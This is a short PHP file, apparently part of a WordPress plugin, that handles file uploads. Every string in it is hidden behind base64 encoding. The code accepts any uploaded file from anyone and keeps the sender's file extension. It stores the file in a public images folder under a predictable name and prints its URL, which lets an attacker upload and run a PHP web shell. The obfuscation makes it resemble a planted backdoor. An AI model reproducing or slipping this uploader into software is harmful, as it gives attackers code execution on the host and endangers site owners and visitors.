<? 
//header('content-type: text/html; charset=iso-8859-2');
header(base64_decode('Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTg='));
header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAq'));

	if ($_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')]) {
            if (!$_FILES[base64_decode('ZmlsZQ==')][base64_decode('ZXJyb3I=')]) {
                $name = md5(rand(100, 200));
                $ext = explode(base64_decode('Lg=='), $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')]);
                $filename = $name . base64_decode('Lg==') . $ext[1];
                $destination = base64_decode('aW1hZ2VzLw==') . $filename;
                $location = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')];
                move_uploaded_file($location, $destination);
                echo base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].base64_decode('L3dwLWNvbnRlbnQvcGx1Z2lucy90dXJuLXdwLXRvLWFuZHJvaWQvc2VydmVyL2ltYWdlcy8=') . $filename;
            }
            else {
              echo  $message = base64_decode('T29vcHMhICBZb3VyIHVwbG9hZCB0cmlnZ2VyZWQgdGhlIGZvbGxvd2luZyBlcnJvcjogIA==').$_FILES[base64_decode('ZmlsZQ==')][base64_decode('ZXJyb3I=')];
            }
    }
?>